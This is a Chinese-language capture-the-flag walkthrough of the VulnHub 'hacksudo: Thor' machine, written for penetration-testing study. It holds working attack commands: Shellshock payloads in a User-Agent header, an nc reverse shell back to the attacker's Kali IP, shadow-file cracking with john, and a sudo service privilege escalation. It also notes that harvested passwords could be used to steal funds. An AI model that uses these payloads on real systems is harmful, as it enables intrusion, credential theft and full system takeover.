# 相关信息

kali：192.168.21.13/24

靶机：192.168.21.83/24

靶机介绍：[hacksudo: Thor ~ VulnHub](https://www.vulnhub.com/entry/hacksudo-thor,733/)

靶机下载：https://download.vulnhub.com/hacksudo/hacksudo---Thor.zip

难度：中

# 文字思路

## 全流程思路：

- 主机发现	端口扫描	
- web目录爬取：重点关注 `cgi`的知识
- 开源源代码泄露	默认账号密码	
- sql注入：对于打点其实是没有任何帮助的
- 破壳漏洞	
- GTFOBins提权：对于这个网站给予高度的重视

## 下意识的操作

1. 一定要手动的尝试弱密码爆破登陆。
2. 在真实的渗透测试中，如果在浏览网页发现了相关的联系电话，邮箱等，一定要记下来为密码爆破做准备。
3. `CGI`------> 破壳漏洞

## 主要的知识点

1. `CGI`------> 破壳漏洞
2. 权限漏洞利用网址：[GTFOBins](https://gtfobins.github.io/)

# 具体流程

## 信息搜集

1. 发现主机，扫描相关端口和版本。我们发现了web服务然后进行相关的访问。

    <img src="https://image.cchl.fun/kali_image/image-20230529151518321.png" alt="image-20230529151518321" style="zoom: 50%;" />

    访问相关的页面后我们发现这大概可能是个网上银行的前台登陆页面，我们进行常规的弱密码破解也是无法成功的（==一定要手动的尝试弱密码爆破==），然后翻看相关的网页信息也是没有太大的帮助的（==在真实的渗透测试中，如果在浏览网页发现了相关的联系电话，邮箱等，一定要记下来为密码爆破做准备==）

    <img src="https://image.cchl.fun/kali_image/image-20230529151715952.png" alt="image-20230529151715952" style="zoom:50%;" />

2. 依次浏览浏览网页的源码

    1. HOME：发现部分后台的路径 `images`,不过访问后是没有太多的价值。

        <img src="https://image.cchl.fun/kali_image/image-20230529152244279.png" alt="image-20230529152244279" style="zoom: 67%;" />

    2. NEWS：结果我们发现一个注释 `cgi`来提示我们该网页的开可能使用了 `cgi`的web开发框架。通过这个信息我进而访问这种开发框架默认的网页路：`/cgi-bin/`。结果发现返回 `403`，表明该文件夹是存在的。                                         [ ==什么是CGI==](#tag1)  

        ==这里注意：虽然我们无法访问该网页目录，但是并不代表我们一定无法访问该目录下的文件会 403。因为开发人员可能只对文件夹进行了访问控制，而对里面的文件没有进行相关的设置==                                           <a id='back1'></a>

        

        ![image-20230529153626593](https://image.cchl.fun/kali_image/image-20230529153626593.png)

        <img src="https://image.cchl.fun/kali_image/image-20230529153951071.png" alt="image-20230529153951071" style="zoom:67%;" />

    3. 后续的并没有什么重要信息

3. 进行相关 `web`目录的爬取: `dirsearch -u http://192.168.21.83/`。 发现了个非常非常有用的文件 `README.md`和另一个非常重要的 `/admin_login.php`这个登陆的后台页面。（记得进行迭代爬取）

    <img src="https://image.cchl.fun/kali_image/image-20230529155038332.png" alt="image-20230529155038332" style="zoom:50%;" />

    访问下载 `README.md`来进行浏览。我们发现个非常重要的信息 ==这个网站是开源的==。这不就是相当于白盒测试吗？

    ![image-20230529160057189](https://image.cchl.fun/kali_image/image-20230529160057189.png)

    ![image-20230529160159404](https://image.cchl.fun/kali_image/image-20230529160159404.png)

4. 同时我们阅读作者提供的相关说明我们发现了 ==默认管理员密码==，同时结合我们爬取到的 `admin_login.php`来尝试登陆，令人惊喜的是我们成功进入后台。虽然在后台具有很高的查看权限（包括各个用户的密码），甚至相关的网页模块是具有 `sql注入`的明显漏洞的，但是都是没有帮助我们突破边界的有效信息。

    ![image-20230529160423028](https://image.cchl.fun/kali_image/image-20230529160423028.png)

    ![image-20230529160557913](https://image.cchl.fun/kali_image/image-20230529160557913.png)

## 业务漏洞

​		这一部分和打点拿下权限是没有关系，但是==却非常的贴合渗透测试工作中的工作要求。==

​		我们进入后台后是可以直接查阅用户和其他管理员的密码的。再结合这是个银行业务的 `web`我们完全可以创建一个账户，然后利用入侵得到的用户密码来进行资金的转账窃取。

​		同时我们发现一个更严重的问题。==当我们转账的时候转账密码和登陆密码是一致的==。该系统并没有强制要求用户设置不同的密码。==进一步的提示我们在测试的时候一定要要求相关业务的密码是不能一致==。

## 破壳漏洞利用

> 这个靶机的破壳漏洞是结合 `cig`网页开发来利用的（允许调用外部程序包括`shell`）
>
>  [==什么是破壳漏洞？==](#tag2) <a id='back2'></a>    

1. 结合我们一开始对相关目录的发现，现在对 `cgi-bin`目录进行==迭代的目录爬取==（做这一步的原因：1，必做的操作。2，结合 `cgi`有这个目录。3，`cgi`可能产生的破壳漏洞是需要有对于的`cgi`,`sh`脚本的）

    结果我们也是发现两个重要的文件 `backup.cgi`,`shell.sh`

    ```bash
    dirsearch -u http://192.168.21.83/cgi-bin/ -f -e cgi,sh
    ```

    <img src="https://image.cchl.fun/kali_image/image-20230529170134012.png" alt="image-20230529170134012" style="zoom:50%;" />

2. 然后对发现的两个重要文件进行是否具有 ==破壳漏洞==的判断，（kali非常的集成，不需我人为的判断是否有相关的漏洞条件）,结果我们发现这两个 `web`文件都是有相关的漏洞利用条件的。

    ```bash
    nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 192.168.21.83
    nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/backup.cgi,cmd=ls 192.168.21.83
    ```

    <img src="https://image.cchl.fun/kali_image/image-20230529170738633.png" alt="image-20230529170738633" style="zoom:50%;" />

    <img src="https://image.cchl.fun/kali_image/image-20230529170918705.png" alt="image-20230529170918705" style="zoom:50%;" />

3. 由于破壳漏洞是具有远程代码执行漏洞，我们就可以进行 `shell`的反弹了。我们是使用 `curl`来访问包含漏洞的文件，通过指定访问的 `user-agent`头部来载荷`payload：which ns`来帮我们定位靶机上 `nc`的位置。

    [==为什么payload放在user-agent头部上==](#tag7)     <a id='back7'></a>

    ```bash
    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'which nc'" \http://192.168.21.83/cgi-bin/shell.sh
    ```

    <img src="https://image.cchl.fun/kali_image/image-20230529171241985.png" alt="image-20230529171241985" style="zoom:67%;" />

4. 确认 `nc`的位置后就是进行 `shell`的反弹了，可以发现 `kali`成功的和靶机进行了连接。

    ```bash
    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'nc -e /bin/bash 192.168.21.13 4444'" \http://192.168.21.83/cgi-bin/shell.sh
    ```

    <img src="https://image.cchl.fun/kali_image/image-20230529172010678.png" alt="image-20230529172010678" style="zoom:67%;" />

5. 进行相关常规信息的搜集，同时升级一下shell方便交互，输入：`python -c 'import pty;pty.spawn("/bin/bash")'`

    当我们搜集到 `sudo -l`的时候发现了我们一个文件路径 `/home/thor/./hammer.sh`，同时还提示我们该文件的所有者是 `thor（雷神索尔）`

<img src="https://image.cchl.fun/kali_image/image-20230529172431815.png" alt="image-20230529172431815" style="zoom: 67%;" />

6. 但是当我们访问的时候发现我们的权限是不够的，同时由于 `sh`是 `cgi`的脚本后缀名。我们直接以以 `thor`用户身份来运行该脚本发现它提示我们输入一个 `Secret Key`,我们随便输入一个 `id`字符串。又提示我们输入一个 `Secret massage`。我们不断地试错发现这里的可以输入任何值，当我们如果输入的一个 `shell`命令时，还会返还命令的执行结果。比如这里我们输入 `pwd`就可以看出端倪。

    <img src="https://image.cchl.fun/kali_image/image-20230529173152859.png" alt="image-20230529173152859" style="zoom:67%;" />

    这里我们重复执行改脚本来验证我们的猜想

    <img src="https://image.cchl.fun/kali_image/image-20230529173316586.png" alt="image-20230529173316586" style="zoom:50%;" />

## 提权

1. 既然这个脚本可以执行 `shell`命令，我们是否可以直接开启个 `bash`子进程呢？当我们验证后果然可以，然后重复我们刚刚突破边界进入靶机的操作，进行基本信息的收集。

    直到 `sudo -l`我们又发现非常重要的信息：1，以 `root`使用 `cat`。2，以 `root`使用 `/usr/sbin/service`

    <img src="https://image.cchl.fun/kali_image/image-20230529173541821.png" alt="image-20230529173541821" style="zoom:67%;" />

2. 上面的两个重要发现直接决定了我们提权的两个重要方向：

    1. 直接通过 `cat`读取`shadow`文件来，然后使用 `john`工具来进行密码的爆破。拿到相关的密码，`but`这是个非常慢的方法同时还有极大的失败可能。

        大致相关爆破命令如下：

        ```bash
        unshadow shadow.txt > shadow
        john -w=/usr/share/john/password.lst --rules shadow
        ```

        ![image-20230529173641463](https://image.cchl.fun/kali_image/image-20230529173641463.png)

    2. 通过 `/usr/sbin/service`权限的配置不当来直接提升变为 `root`用户。输入 `sudo service ../../bin/bash`就可以完成提权。

        <img src="https://image.cchl.fun/kali_image/image-20230529174156207.png" alt="image-20230529174156207" style="zoom:67%;" />

        但是我们不经好奇为什么输入 `sudo service ../../bin/bash`这样就可以了？你是怎么知道这个命令的？其实也很简单我们可以访问一个网址：[GTFOBins](https://gtfobins.github.io/)，来具体的了解。                 [==GTFOBins相关介绍==](#tag5)     <a id='back5'></a>

        <img src="https://image.cchl.fun/kali_image/image-20230529174359639.png" alt="image-20230529174359639" style="zoom:67%;" />

        > 这里 `/bin/sh`我们在靶机上写 `/bin/bash`是没有任何问题的。

# 相关工具/命令

## 命令

### head

1. what?

    `head` 是一个用于查看文件开头内容的命令。它默认显示文件的前几行，通常用于快速预览文件的内容。

2. 相关参数

    - `-n num`：显示文件的前 `num` 行。例如，`head -n 10 file.txt` 将显示 `file.txt` 文件的前 10 行内容。
    - `-c num`：显示文件的前 `num` 个字节。例如，`head -c 100 file.txt` 将显示 `file.txt` 文件的前 100 个字节内容。
    - `-q`：静默模式，不显示文件名。通常用于处理多个文件时，只显示内容而不显示文件名。
    - `-v`：显示文件名。通常与 `-q` 选项一起使用，用于显示处理多个文件时的文件名。

### env

查看当前 `shell`的环境变量，

### export

1. what?

    用于自定义环境变量

2. 具体实例

    1. export var="value"：就可以创建自己的环境变量

## 工具

### unshadow

1. unshadow命令基本上会结合/etc/passwd的数据和/etc/[shadow](https://so.csdn.net/so/search?q=shadow&spm=1001.2101.3001.7020)的数据，创建1个含有用户名和密码详细信息的文件。==一般将其处理为john能处理的模式==
2. 具体实例
    1. unshadow /etc/passwd /etc/shadow > shadow

### GTFOBins

1. what?                                                     [==返回==](#back5)     <a id='tag5'></a> 

    是一个本地提权的非常重要的一个网址，总结了系统中某个应用权限设置不当而导致的可能的提升权限，读写等等的漏洞。

    在我们渗透学习中分成的重要。	                    [GTFOBins](https://gtfobins.github.io/)

# 相关payload

### CGI远程代码执行payload

1. 利用条件

    - web开发中有cgi
    - 找到cg,sh的web文件目录
    - nmap判断确实存在漏洞

2. 直接 `kali`终端输入：

    ```bash
    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'which nc'" \http://192.168.21.83/cgi-bin/shell.sh
    ```

### service 提权

1. 利用条件

    - `service`权限为 `sudo`

2. 直接在靶机终端输入

    ```bash
    sudo service ../../bin/bash
    ```



# 复盘/相关知识

## 重要 

### 破壳漏洞

1. what?                                                         [==返回==](#back2)     <a id='tag2'></a>

     ​	  `bash` 父进程中的特殊变量字符串(这里指字符串内容为函数)成为环境变量后，在子进程中调用该字符串时将其理解为函数执行。以下为相关的参考资料：

     - [(*´∇｀*) 欢迎回来！ (cnblogs.com)](https://www.cnblogs.com/Cl0ud/p/14248937.html)

     - [Bash破壳漏洞CVE-2014-6271复现分析 – Zgao's blog](https://zgao.top/bash破壳漏洞cve-2014-6271复现分析/)

2. 相关说明

     1. 漏洞的利用条件：
          - 被攻击的bash存在漏洞（版本小于等于4.3）
          - 攻击者可以控制环境变量
          - 新的bash进程被打开触发漏洞并执行命令
     2. 漏洞的利用场景：
          1. 程序在某一时刻使用 bash 作为脚本解释器处理环境变量赋值
          2. 环境变量的赋值字符串来源于用户输入 , 且没有通过有效的过滤

        这些的条件都是可以在集成化的工具下自动的帮助判断，如 `nmap`的脚本判断。

3. 具体的答疑：                                                   [==返回==](#back7)     <a id='tag7'></a>

     1. 为什么我们将 `paylaod` 要放入到`User-agent`里面，就可以有效的执行？

          > CGI脚本会继承系统的环境变量。CGI环境变量在CGI程序启动时初始化，在结束时销毁。
          >
          > 当一个CGI脚本未被HTTP服务器调用时，它的环境变量几乎是系统环境变量的复制，当这个CGI脚本被HTTP服务器调用时，它的环境变量就会增加关于HTTP服务器，客户端，CGI传输过程等条目

     ​      也就是说，每当CGI脚本接收到一次HTTP请求，它的环境变量就会新增一些条目，比如`User-agent`，`Connection`等信息

     ​      所以这里我们通过修改`User-Agent`来修改CGI环境变量。

     2. 在这台本机的实战中，其实是弱化了对这个漏洞的具体原理理解。你只需要使用相关的脚本对漏洞进行测试，能不能行渗透工具会自动的识别。

### bash函数的定义格式

1. 格式：`function_name() {函数体}`
1. 相关教程：[Shell 函数 | 菜鸟教程 (runoob.com)](https://www.runoob.com/linux/linux-shell-func.html)

## 了解

### URI,URN,URL是什么关系

URI 是用于标识和定位资源的字符串，包括 URL（Uniform Resource Locator）和 URN（Uniform Resource Name）两种形式。URL 是 URI 的一种常见形式，它包含了资源的位置和访问方式。

### cgi开发

1. what? 										[==返回==](#back1)     <a id='tag1'></a>

    ​	是一种用于在 Web 服务器和外部应用程序之间进行通信的标准接口。它允许 Web 服务器调用外部程序来处理客户端请求，并将处理结果返回给客户端。

    Web 开发中，CGI 被用于实现动态网页和交互式 Web 应用程序。

2. 相关渗透思路：

    1. 一般使用 `cgi`开发的web网页都会存在一个：`/cgi-bin/`的目录，里面存放的都是后缀为： `.cgi或.sh`的 `cgi`脚本文件。--------> ==目录发现==
    2. 大致的思路就是我们上载恶意数据，让服务端通过 `cgi`调用其他程序。利用其他程序或者其他漏洞来执行我们的恶意数据从而进行相关的渗透测试。---------> ==破壳漏洞==

